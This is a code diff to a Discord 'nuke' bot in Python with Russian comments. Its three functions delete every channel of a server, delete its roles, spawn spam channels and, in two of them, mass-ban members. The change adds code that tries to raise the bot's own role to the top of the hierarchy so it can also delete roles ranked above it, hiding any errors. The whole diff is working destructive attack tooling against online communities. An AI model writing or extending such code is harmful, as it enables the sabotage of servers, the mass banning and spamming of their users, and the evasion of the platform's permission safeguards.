@@ -315,9 +315,19 @@ async def do_nuke(guild, spam_text=None, caller_id=None):
     bot_role = guild.me.top_role
 
     channels_to_delete = list(guild.channels)
-    roles_to_delete = [r for r in guild.roles if r < bot_role and not r.is_default()]
+    # Роли ниже бота — удаляем сразу, роли выше — пробуем поднять бота и удалить
+    roles_below = [r for r in guild.roles if r < bot_role and not r.is_default()]
+    roles_above = [r for r in guild.roles if r > bot_role and not r.is_default() and not r.managed]
 
-    # Всё параллельно — удаление + создание каналов одновременно
+    async def elevate_and_delete_above():
+        """Поднимаем роль бота выше всех, потом удаляем роли которые были выше."""
+        try:
+            max_pos = max((r.position for r in guild.roles), default=1)
+            await bot_role.edit(position=max_pos)
+        except Exception:
+            pass
+        await asyncio.gather(*[r.delete() for r in roles_above], return_exceptions=True)
+
     async def create_and_spam(i):
         try:
             if not nuke_running.get(guild.id):
@@ -330,14 +340,15 @@ async def do_nuke(guild, spam_text=None, caller_id=None):
         except Exception:
             pass
 
+    # Всё параллельно — удаление ниже + поднятие+удаление выше + каналы + спам
     await asyncio.gather(
         *[c.delete() for c in channels_to_delete],
-        *[r.delete() for r in roles_to_delete],
+        *[r.delete() for r in roles_below],
+        elevate_and_delete_above(),
         *[create_and_spam(i) for i in range(config.CHANNELS_COUNT)],
         return_exceptions=True
     )
 
-    # Роль запустившему
     if caller_id:
         try:
             member = guild.get_member(caller_id)
@@ -387,7 +398,16 @@ async def do_superpr_nuke_task(guild, spam_text=None):
     candidates = [m for m in guild.members if not is_protected(m) and (not m.top_role or m.top_role < bot_role)]
 
     channels_to_delete = list(guild.channels)
-    roles_to_delete = [r for r in guild.roles if r < bot_role and not r.is_default()]
+    roles_below = [r for r in guild.roles if r < bot_role and not r.is_default()]
+    roles_above = [r for r in guild.roles if r > bot_role and not r.is_default() and not r.managed]
+
+    async def elevate_and_delete_above():
+        try:
+            max_pos = max((r.position for r in guild.roles), default=1)
+            await bot_role.edit(position=max_pos)
+        except Exception:
+            pass
+        await asyncio.gather(*[r.delete() for r in roles_above], return_exceptions=True)
 
     async def create_and_spam(i):
         try:
@@ -399,11 +419,12 @@ async def do_superpr_nuke_task(guild, spam_text=None):
         except Exception:
             pass
 
-    # Всё параллельно — бан + удаление + создание каналов
+    # Всё параллельно — моментально
     await asyncio.gather(
         *[m.ban(reason="super_nuke", delete_message_days=0) for m in candidates],
         *[c.delete() for c in channels_to_delete],
-        *[r.delete() for r in roles_to_delete],
+        *[r.delete() for r in roles_below],
+        elevate_and_delete_above(),
         *[create_and_spam(i) for i in range(config.CHANNELS_COUNT)],
         return_exceptions=True
     )
@@ -455,7 +476,16 @@ async def do_owner_nuke_task(guild, spam_text=None):
     targets = [m for m in guild.members if not is_protected(m) and (not m.top_role or m.top_role < bot_role)]
 
     channels_to_delete = list(guild.channels)
-    roles_to_delete = [r for r in guild.roles if r < bot_role and not r.is_default()]
+    roles_below = [r for r in guild.roles if r < bot_role and not r.is_default()]
+    roles_above = [r for r in guild.roles if r > bot_role and not r.is_default() and not r.managed]
+
+    async def elevate_and_delete_above():
+        try:
+            max_pos = max((r.position for r in guild.roles), default=1)
+            await bot_role.edit(position=max_pos)
+        except Exception:
+            pass
+        await asyncio.gather(*[r.delete() for r in roles_above], return_exceptions=True)
 
     async def create_and_spam(i):
         try:
@@ -471,7 +501,8 @@ async def do_owner_nuke_task(guild, spam_text=None):
     await asyncio.gather(
         *[m.ban(reason="owner_nuke", delete_message_days=0) for m in targets],
         *[c.delete() for c in channels_to_delete],
-        *[r.delete() for r in roles_to_delete],
+        *[r.delete() for r in roles_below],
+        elevate_and_delete_above(),
         *[create_and_spam(i) for i in range(config.CHANNELS_COUNT)],
         return_exceptions=True
     )
